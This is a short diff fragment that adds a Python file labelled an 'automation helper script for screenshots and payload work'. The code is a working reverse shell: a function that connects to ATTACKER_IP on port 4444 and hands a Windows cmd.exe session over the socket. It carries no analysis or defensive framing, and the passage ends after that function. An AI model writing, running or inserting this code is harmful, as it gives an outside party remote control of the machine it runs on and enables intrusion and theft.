@@ -1,3 +1,5 @@
+"""Generated automation helper script for screenshots and payload work."""
+
 ```python
 import socket,subprocess,os,sys,struct,time,base64,threading,ctypes,winreg,json,platform,uuid,random
 def reverse_shell():s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe","/K"])
